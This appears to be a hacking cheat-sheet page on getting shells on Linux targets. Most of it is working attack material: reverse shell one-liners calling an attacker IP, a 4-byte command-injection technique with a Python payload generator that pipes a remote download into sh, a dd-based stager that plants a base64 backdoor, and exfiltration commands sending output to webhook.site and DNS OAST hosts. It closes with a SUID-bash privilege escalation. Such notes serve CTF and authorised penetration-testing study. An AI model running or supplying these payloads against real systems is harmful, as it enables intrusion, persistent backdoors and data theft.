---
description: Specific tricks to get a shell for hacking Linux-based boxes
---

# Shells

## Reverse Shells

{% embed url="https://www.revshells.com/" %}

{% code title="Common reverse shells" %}
```shell
bash -i >& /dev/tcp/$YOUR_IP/1337 0>&1
sh -i >& /dev/tcp/$YOUR_IP/1337 0>&1
bash -c 'bash -i >& /dev/tcp/$YOUR_IP/1337 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $YOUR_IP 1337 >/tmp/f
rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|sh -i 2>&1|nc $YOUR_IP 1337 >/tmp/g
```
{% endcode %}

If you find a filter or have weird/short input, try simply downloading and then executing in two separate commands:

{% code title="Attacker" %}
```shell-session
$ mkdir http
$ nano http/shell.sh  # Can be index.html to do just `wget $YOUR_IP` on the victim
$ default listen http http
```
{% endcode %}

{% code title="Victim" %}
```shell-session
$ wget $YOUR_IP/shell.sh
$ sh shell.sh
```
{% endcode %}

With very limited communication available, you can try a few things:

<pre class="language-shell"><code class="lang-shell"><strong>sleep 10  # Should wait 10 seconds if code is executed
</strong># DNS
interactsh-client -v  # Start as attacker (https://github.com/projectdiscovery/interactsh)

<strong>nslookup nftca6lpouq.oast.live  # Any DNS request will trigger in tool
</strong><strong>bash -c 'echo 1 > /dev/tcp/`whoami`.`hostname`.nftca6lpouq.oast.live/443'  # Exfiltrate command output
</strong># HTTP
<strong>curl nftca6lpouq.oast.live
</strong></code></pre>

### RCE in 4 bytes

Sometimes you're limited in the length of the commands you can execute. There is a technique in bash to execute commands and save things to files, and eventually execute arbitrary code by just sending multiple 4-byte commands. The technique was a solution to a challenge by [Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2).&#x20;

The idea goes like this. Using file redirection with `>` you can save files with a name. Then we can slowly build out some letters to form a different command, and we can combine the letters using `dir`. This command just lists the current directory and places them all after each other separated by spaces. Using the `*` wildcard all files in the current directory will be inserted but in alphabetical order. This makes it quite hard to do much right now:

```shell-session
$ >dir  # Define dir command
$ >sl   # ls
$ >g\>  # >g
$ >ht-  # -th
$ *>v   # Execute dir command to file "v"
```

The `v` file now contains `g> ht- sl`. Reversed this would be `ls -th >g`, which allows us to list the files ordered by **time**. This way we don't have the restriction to have the command be in alphabetical order.&#x20;

```shell-session
$ >rev  # Define rev command
$ *v>x  # * wildcard matching only rev and v files, saving to x
```

Now `x` contains the desired `ls -th >g` which we can execute whenever we want. Now that the final file will be ordered by time, we can just write out the full payload character by character. Later we will create a file that has all of these separated by a newline, so we need to add a `\` at the end to escape the newline. Let's make `curl localhost:8000|sh;` for example:

```shell-session
$ >\;\\
$ >sh\\
$ >\|\\
$ >00\\
$ >80\\
$ >t:\\
$ >os\\
$ >lh\\
$ >ca\\
$ >lo\\
$ >\ \\
$ >rl\\
$ >cu\\
```

In an actual attack, you would send only one `\` at the end, but here in the interactive bash, we need to escape it ourselves. Executing the `ls -th` command we made earlier now, it gives us the desired command with backslashes to escape the newlines:

```shell-session
$ ls -th | cat
g
cu\
rl\
 \
lo\
ca\
lh\
os\
t:\
80\
00\
|\
sh\
;\
x
rev
v
ht-
g>
sl
dir
```

Finally, we can execute the `x` script to do the above command into a file called `g`. Then we can run the g script to actually run the payload that fetches a script from the `localhost:8000` address, of course, this can be any site of your own to host a malicious payload on.&#x20;

```shell-session
$ sh x  # ls -th >g
$ sh g  # Run final payload
```

To automatically run any payload you want, I made the following Python script to showcase the attack and create any payload:

{% code title="generate.py" %}
```python
import os
from time import sleep

COMMAND = "curl localhost:8000|sh;"  # Needs ; at the end for correct syntax


def is_normal_char(c):  # Safe characters that don't need to be escaped
    return c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,._+:@%/-"

def escape(c):
    if is_normal_char(c):
        return c
    else:
        return "\\" + c

def command_to_chunks(command):
    command = list(command)  # Allows .pop() method
    result = []
    while True:  # Go through whole command
        try:
            chunk = escape(command.pop())
            if len(chunk + escape(command[-1])) <= 2:  # Test potential extra character
                chunk = command.pop() + chunk  # Add another character because enough space
            
            result.append(f">{chunk}\\")
        except IndexError:  # If done
            break
    
    return result


payload = [
    # generate "g> ht- sl" to file "v"
    '>dir',  # Define dir command
    '>sl',   # ls
    '>g\>',  # >g
    '>ht-',  # -th
    '*>v',   # Execute dir command to file "v"

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',  # Define rev command
    '*v>x',  # * wildcard matching only rev and v files, saving to x
]

payload += command_to_chunks(COMMAND)

payload += [
    "sh x",  # ls -th >g
    "sh g",  # Run final payload
]

for c in payload:
    print(c)  # Send to target

# Optional: Execute proof-of-concept locally
# for c in payload:
#     sleep(0.1)  # Wait to make sure order is correct (no race conditions)
#     if len(c) <= 4:  # Max 4 bytes
#         os.system(c)
```
{% endcode %}

### Restricted charset + no HTTP/DNS (dd-shell)

For very restricted scenarios where you are able to inject one command without any special characters, and you are not able to fetch a payload using curl or wget. The only required characters for this technique are: `[a-zA-Z0-9/= ]`. Only the slash, equals and space should be allowed, and this trick will allow you to run an arbitrarily complex payload on any Unix environment (even [docker/alpine](https://hub.docker.com/_/alpine)).

{% code title="Payload" %}
```bash
# Create 'base64 -d /tmp/2|sh' stager in /tmp/1
dd if=/proc/self/cmdline of=base64 of=/tmp/1 bs=1 count=6 skip=28 seek=0         # 'base64'
dd if=/proc/net/dev of=/tmp/1 bs=1 count=1 skip=7 seek=6                         # ' '
dd if=/proc/net/dev of=/tmp/1 bs=1 count=1 skip=5 seek=7                         # '-'
dd if=/proc/self/cmdline of=d of=/tmp/1 bs=1 count=2 skip=28 seek=8              # 'd'
dd if=/proc/net/dev of=/tmp/1 bs=1 count=1 skip=7 seek=9                         # ' '
dd if=/proc/self/cmdline of=/tmp/2 of=/tmp/1 bs=1 count=6 skip=28 seek=10        # '/tmp/2'
dd if=/proc/net/dev of=/tmp/1 bs=1 count=1 skip=6 seek=16                        # '|'
dd if=/proc/self/cmdline of=sh of=/tmp/1 bs=1 count=2 skip=28 seek=17            # 'sh'

# Create encoded "echo 'echo $1|base64 -d|sh'>/tmp/s" writer in /tmp/2
dd if=/proc/self/cmdline of=ZWNobyAnZWNobyAkMXxiYXNlNjQgLWR8c2gnPi90bXAvcw== of=/tmp/2 bs=1 count=48 skip=28 seek=0
# Decode using 1st stager
sh /tmp/1

# Now run any encoded command with it (easily repeatable)
sh /tmp/s aWQgPiAvdG1wL3B3bmVk  # 'id > /tmp/pwned'
```
{% endcode %}

Note that all comments are only for clarification, and should be removed in your exploit.

In this payload, we heavily abuse the `dd` command to read and write at specific locations. We also make use of the `/proc` filesystem, first by reading from `/proc/self/cmdline` to get the current command, in which we hide a string inside a duplicate `of=` parameter (eg. "base64"). We read 6 bytes into the `/tmp/1` file on which we build further. We also use the static `/proc/net/dev` file that always starts with the same table header, allowing us to write some special characters like `-`, `|` and   (not included in `cmdline`).&#x20;

With this, we write a simple stager for `base64 -d /tmp/2|sh` so that we can write a longer payload inside of `/tmp/2`. We use this to write a backdoor inside `/tmp/s` that will execute any base64 argument it takes, and can be abused to get past the restricted charset.

## Background Shells

When you have code execution, a problem you might find when connecting to a Reverse Shell is that it **exits** **after some time**, when the process is killed. This can be annoying as you only have a few seconds to execute commands interactively.&#x20;

One solution would be to add some **persistence** method instead of connecting to a reverse shell, allowing you access at any time. This can be done by appending to `~/.ssh/authorized_keys` or leaking `~/.ssh/id_rsa` if SSH is enabled, and there are many more backdoors you can create such as webshells. These techniques depend on the target, however, so they won't always work.&#x20;

Another way that might be preferable is running your Reverse Shell in a background process that doesn't exit. Commands like `screen` or `tmux` can start such a session if they are available, or you can use [`nohup`](https://en.wikipedia.org/wiki/Nohup) which ignores the hangup (HUP) signal, and can run together with the `&`:

```bash
nohup bash -c 'sh -i >& /dev/tcp/127.0.0.1/1337 0>&1 &'
```

## Data Exfiltration

When executing commands, the main goal is to read its output to reach further into the system or to leak sensitive data. While it may sound simple, in some cases, this is made harder due to protections such as firewalling. You won't receive your reverse shell if a system prevents outgoing TCP connections to random ports like `:1337`. Therefore, we need to get a little more clever sometimes.&#x20;

### HTTP(S)

Some firewalls prevent random unknown ports but allow ports like 80 or 443 for HTTP and HTTPS traffic. Sometimes this is as simple as changing the port of your shell to either of these ports, but in other cases, the firewall will also check if a real HTTP request is being made.&#x20;

To quickly test if HTTP(S) or DNS traffic is allowed, try using `interactsh-client` to quickly get a public subdomain where all interactions will be logged:

{% embed url="https://github.com/projectdiscovery/interactsh?tab=readme-ov-file#interactsh-client" %}

{% code title="Start listener" %}
```bash
interactsh-client -v
```
{% endcode %}

After confirming that, for example, HTTPS traffic is allowed, you can wrap your TCP connection over SSL which is indistinguishable from real HTTP traffic. For a clean shell, tools like [reverse\_ssh](https://github.com/NHAS/reverse_ssh) implement this nicely with many extra features like alternative protocols.&#x20;

For quick and dirty exfiltration via HTTP, services like [requestbin.com](https://requestbin.com/r) or [webhook.site](https://webhook.site/) offer a UI and a subdomain to make requests to, and you can quickly see all HTTP interactions with potentially exfiltrated data via the URL, or large data via the body:

{% code title="Exfiltrate data (GET)" %}
```bash
curl -G "https://webhook.site/$GUID" --data-urlencode "output=$(id)"
```
{% endcode %}

{% code title="Exfiltrate data (POST)" %}
```bash
curl "https://webhook.site/$GUID" -d "$(id)"
```
{% endcode %}

### DNS

Like before, [`interactsh-client`](https://github.com/projectdiscovery/interactsh?tab=readme-ov-file#interactsh-client) can be used to confirm interaction with a wildcard subdomain. As it allows anything before the given subdomain, you can exfiltrate small amounts of data with it:

{% code title="Exfiltrate data (DNS)" %}
```bash
< /dev/tcp/$(whoami).cosdh12q8guc0k2095k0ohqbeffp1drpg.oast.site/80
```
{% endcode %}

This should result in a few DNS lookups with the target's username as the prefix:

{% code title="interactsh-client log" %}
```
[INF] Listing 1 payload for OOB Testing
[INF] cosdh12q8guc0k2095k0ohqbeffp1drpg.oast.site
[uSEr.COSdH12q8GuC0K2095K0ohQbEFFp1dRPG] Received DNS interaction (A) from ...
[USeR.CoSdh12q8gUc0k2095k0oHqbeFfp1drPG] Received DNS interaction (AAAA) from ...
[user.cOsdh12q8GUc0K2095K0OHqbefFp1dRPg] Received DNS interaction (AAAA) from ...
```
{% endcode %}

For a clean shell, there exist tools that implement the above and a better technique for downloading data using TXT records. It should be noted, however, that such a shell will be very slow and hard to use as this way of communicating is very unorthodox. [Poor man's Reverse DNS Shell](https://gist.github.com/FrankSpierings/4fe924866634a470bc46218d6d24a183#file-server-py)

### Read from stored location

The server you are exploiting is almost always directly accessible to you, so if it cannot connect to the outside, it must still be able to respond to your requests. We can abuse this by storing the output data at an accessible place like `/static/output.txt`, and then reading this data by accessing the path.&#x20;

Another similar idea is doing the same for SQL data, imagine you have a blind SQL injection with stacked queries (you are able to INSERT/UPDATE). In this case, you can insert/update the data you want to exfiltrate to another place that you can read, like your users description or a comment.&#x20;

## Privilege Escalation

Often in privilege escalation, you're letting a high-privilege user execute some command. Sometimes you can't directly execute a shell as that user and have to run some other command to send a way to get a shell somewhere. One simple way is to just execute a reverse shell as that user. Then you will get a privileged reverse shell in your listener. See [#reverse-shells](hacking-linux-boxes.md#reverse-shells "mention") for some examples of this.&#x20;

Another easy way if you already have access to the box, is to create a [#setuid](linux-privilege-escalation/command-triggers.md#setuid "mention") binary of bash that the target user is the owner of. The safest way to do this is to first copy /bin/bash to another location, which will make the owner of the file the user that executed the command. Then to later get back those privileges just add the SUID bit with `chmod +s` to take over the privileges of the owner when you execute the program as a low-privilege user.&#x20;

{% code title="Let target execute:" %}
```shell
cp /bin/bash /tmp/bash; chmod +xs /tmp/bash
```
{% endcode %}

<pre class="language-shell-session" data-title="Low-privilege user"><code class="lang-shell-session"><strong>$ /tmp/bash -p  # -p to maintain privileges
</strong># id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
</code></pre>

{% hint style="warning" %}
**Warning**: While this shell allows filesystem access as `root`, it won't perfectly with with all commands as your main user is still `user`, we only raised their privileges. You can solve this by getting a clean shell with techniques like [#root-etc-passwd](../web/server-side/arbitrary-file-write.md#root-etc-passwd "mention").
{% endhint %}
